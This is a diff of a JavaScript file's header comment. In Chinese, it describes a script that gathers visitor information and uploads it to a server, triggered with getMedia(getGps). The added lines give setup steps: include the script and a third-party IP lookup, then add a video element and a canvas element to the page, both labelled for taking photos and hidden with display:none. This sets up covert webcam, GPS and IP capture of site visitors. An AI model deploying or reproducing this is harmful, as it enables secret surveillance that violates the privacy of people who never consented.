@@ -1,10 +1,16 @@
 /*
  * @Author: whalefall
  * @Date: 2021-08-27 04:28:23
- * @LastEditTime: 2021-08-27 04:28:24
+ * @LastEditTime: 2021-08-27 05:00:24
  * @Description: 获取访客信息并自动上传服务器 激活方法:getMedia(getGps);
- * 前面引入js,后面引入获取ip地址
+ * 前面引入js
+ * <script src="/static/js/getseeinfo.js"></script>
+ 后面引入获取ip地址
  * <script src="http://whois.pconline.com.cn/ipJson.jsp"></script>
+ * 在html中加入
+ * <!-- 拍照用 -->
+	<video id="video" width="600px" height="600px" autoplay="autoplay" style="display: none;"></video>
+	<canvas id="canvas" width="600px" height="600px" style="display: none;"></canvas>
  */
 
 // 储存获取到的信息
